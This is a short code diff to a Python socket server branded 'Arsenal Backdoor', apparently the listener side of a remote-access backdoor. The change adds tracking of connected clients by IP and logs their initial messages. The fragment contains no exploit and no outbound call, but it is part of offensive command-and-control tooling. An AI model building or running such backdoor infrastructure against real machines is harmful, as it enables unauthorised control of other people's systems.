@@ -6,6 +6,8 @@ parser.add_argument('-p', dest='port', help='Hosting port', required=True, type=
 parser.add_argument('-s', dest='host', help='Hosting IP')
 args = parser.parse_args()
 
+clients = {}
+
 if args.host is None:
     args.host = '0.0.0.0'
 
@@ -16,12 +18,18 @@ def get_file(filename):
         f.write(output.stdout)
 
 def client(conn, addr, buff):
-    conn.send(b'Arsenal Backdoor\n')
+    global clients
+    if addr[0] not in clients:
+        conn.send(b'Arsenal Backdoor\n')
+        data = conn.recv(buff)
+        print(addr[0]+':\n'+str(data.strip(), 'utf-8'))
+        data = conn.recv(buff)
+        print(addr[0]+':\n'+str(data.strip(), 'utf-8'))
+        clients[addr[0]] = str(data.strip(), 'utf-8')
+    print(clients)
     while True:
         holder = []
         length = conn.recv(buff)
-        if "Client" in length:
-            continue
         while len(''.join(holder)) < int(length):
             data = conn.recv(buff)
             holder.append(str(data.strip(), 'utf-8'))
